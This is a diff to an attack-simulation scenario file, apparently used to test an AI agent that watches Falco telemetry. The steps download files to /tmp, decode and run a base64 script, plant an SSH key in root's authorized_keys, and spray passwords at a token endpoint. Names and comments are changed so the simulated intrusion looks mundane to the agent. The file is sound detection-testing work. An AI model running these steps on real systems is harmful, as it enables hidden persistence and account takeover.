@@ -92,18 +92,20 @@ scenarios:
     source_user: root
     target_host: canary-1
     default_intensity: 1
+    # Step 1 does not execute web-1's HTML as a script; it only produces the
+    # download + read-from-/tmp signal. No comments inside a `cmd`: Falco records
+    # the whole script as the process command line, where the agent can read it.
+    # File names and the decoded script stay mundane for the same reason.
     steps:
       - cmd: |
-          curl -fsS http://web-1/ -o /tmp/fetched_${iteration}.sh 2>&1 || true
-          # Not actually executing web-1's HTML as a script — just producing
-          # the download+read-from-/tmp signal the telemetry cares about.
-          bash -c "cat /tmp/fetched_${iteration}.sh | head -3" 2>&1 || true
+          curl -fsS http://web-1/ -o /tmp/install_${iteration}.sh 2>&1 || true
+          bash -c "cat /tmp/install_${iteration}.sh | head -3" 2>&1 || true
         repeat: "${intensity}"
         allow_fail: true
       - cmd: |
-          echo "IyEvYmluL2Jhc2gKZWNobyAicGxheWdyb3VuZCBhdHRhY2stc2ltIHJlYWNoZWQ6ICQobG9jYWx0aW1lKSIK" \
-            | base64 -d > /tmp/payload_${iteration}.sh
-          bash /tmp/payload_${iteration}.sh
+          echo "IyEvYmluL2Jhc2gKaWQKdW5hbWUgLWEKaG9zdG5hbWUK" \
+            | base64 -d > /tmp/healthcheck_${iteration}.sh
+          bash /tmp/healthcheck_${iteration}.sh
         repeat: 1
         allow_fail: true
 
@@ -118,11 +120,12 @@ scenarios:
     source_user: root
     target_host: canary-1
     default_intensity: 1
+    # A real-shaped key with an ops-looking comment, as an intruder would plant
+    # it; its private half was discarded at generation.
     steps:
       - cmd: |
           mkdir -p /root/.ssh && chmod 700 /root/.ssh
-          ts=$(date +%s)
-          echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_${iteration}_${ts}_attacker attacker@elsewhere" \
+          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGz2dOFLUJkSPZxK31HYtp250IM690V3Y7nnwT34/xKn deploy@build-02" \
             >> /root/.ssh/authorized_keys
           chmod 600 /root/.ssh/authorized_keys
           ls -la /root/.ssh/authorized_keys
@@ -242,10 +245,10 @@ scenarios:
     source_user: dev.dana
     target_host: office-ws-1
     default_intensity: 6
+    # The loop variable is `u`, not `user`: the runner substitutes ${user} (the source
+    # identity) before the shell runs, so a `user` loop would guess one account five times.
     steps:
       - cmd: |
-          # The loop variable is `u`, not `user`: the runner substitutes ${user} (the source
-          # identity) before the shell runs, so a `user` loop would guess one account five times.
           for u in admin sre.alice dev.dana svc.backups operator; do
             curl -sS -m 5 -o /dev/null -w "%{http_code} $u\n" \
               -d "client_id=admin-cli" -d "grant_type=password" \
